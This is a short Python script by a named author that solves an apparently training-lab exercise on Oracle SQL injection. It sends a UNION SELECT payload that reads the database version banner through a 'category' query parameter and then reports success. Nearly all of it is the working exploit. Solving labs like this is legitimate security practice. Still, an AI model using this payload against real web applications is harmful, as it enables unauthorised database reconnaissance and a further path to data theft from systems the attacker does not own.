##################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 15/9/2023
#
# Lab: SQL injection attack, querying the database type and version on Oracle
#
# Steps: 1. Inject payload in 'category' query parameter
#        2. Retrieve database banner in the response
#
##################################################################################

###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########
url = "https://0a41002c0389dabc8435a10200330064.web-security-academy.net" # change this to your lab URL

try:
    # payload to return the database banner
    payload = "' UNION SELECT banner, null FROM v$version-- -"
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")
    print(Fore.WHITE + "1. Injecting payload in 'category' query parameter.. " + Fore.GREEN + "OK")
    if injection.status_code == 200:
        print(Fore.WHITE + "2. Retrieving database banner in the response.. " + Fore.GREEN + "OK")
        print(
            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    else:
        print(Fore.RED + "[!] Failed to inject the payload")
except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
